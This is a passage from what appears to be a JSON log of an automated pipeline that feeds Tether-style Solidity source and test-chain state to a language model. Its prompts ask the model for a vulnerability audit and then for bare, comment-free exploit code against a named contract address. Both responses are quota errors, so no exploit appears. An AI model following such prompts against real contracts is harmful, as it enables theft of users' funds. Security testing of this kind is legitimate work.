"outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Issue",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Redeem",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Deprecate",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Params",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "DestroyedBlackFunds",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "AddedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "RemovedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Approval",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Transfer",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xe982E462b094850F12AF94d21D470e21bE9D0E9C": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99872199180000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "name": "test",\n        "deprecated": false,\n        "totalSupply": 1,\n        "upgradedAddress": "0x0000000000000000000000000000000000000000",\n        "balances": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "decimals": 1,\n        "maximumFee": 10,\n        "_totalSupply": 1,\n        "getBlackListStatus": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "paused": false,\n        "balanceOf": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "getOwner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "symbol": "test",\n        "basisPointsRate": 1,\n        "isBlackListed": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "MAX_UINT": 115792089237316195423570985008687907853269984665640564039457584007913129639935\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    }\n  ]\n}\n\nResponse format:\n1. Contract Analysis: ...\n2. Vulnerability Assessment: ...  \n3. Exploitation Requirements: ...\n---\n', 'analysis_raw_response': "ERROR: Error code: 429 - {'error': {'message': 'You exceeded your current quota, please check your plan and billing details. For more information on this error, read the docs: https://platform.openai.com/docs/guides/error-codes/api-errors.', 'type': 'insufficient_quota', 'param': None, 'code': 'insufficient_quota'}}", 'contract_analysis': '', 'vulnerability_assessment': '', 'exploitation_requirements': '', 'analysis_duration': 1.8485527038574219}, 'attack': {'attack_prompt': "\nYou are a Solidity exploit developer. Based on the security analysis, create ONLY executable Solidity attack code.\n\nSecurity Analysis:\n\nContract Analysis: \n\nVulnerability Assessment: \n\nExploitation Requirements: \n\n\nTarget Contract Address: 0xC89Ce4735882C9F0f0FE26686c53074E09B0D550\n\nRequirements:\n- Generate ONLY complete, compilable Solidity code\n- Include pragma solidity version \n- Create a contract that can be deployed and executed\n- Ensure to use the same solidity version as the target contract and respect the syntax rules for this version\n- Include an attack function (named 'attack', 'exploit', or 'run')\n- The constructor should take the target contract address as parameter\n- Focus on exploiting the identified vulnerabilities\n- NO explanations, NO comments, ONLY CODE\nReturn format: Pure Solidity code in ```solidity code blocks.\n```pragma solidity 0.4.17\n", 'attack_raw_response': "ERROR: Error code: 429 - {'error': {'message': 'You exceeded your current quota, please check your plan and billing details. For more information on this error, read the docs: https://platform.openai.com/docs/guides/error-codes/api-errors.', 'type': 'insufficient_quota', 'param': None, 'code': 'insufficient_quota'}}", 'code': '', 'code_type': 'solidity', 'attack_duration': 1.7032737731933594}, 'prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmp15ldxvhh.sol",\n  "contracts": [\n    {\n      "contract_name": "Ownable",\n      "address": "0xC89Ce4735882C9F0f0FE26686c53074E09B0D550",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        }\n      ],\n      "functions": [\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0xC89Ce4735882C9F0f0FE26686c53074E09B0D550": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99872199180000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, 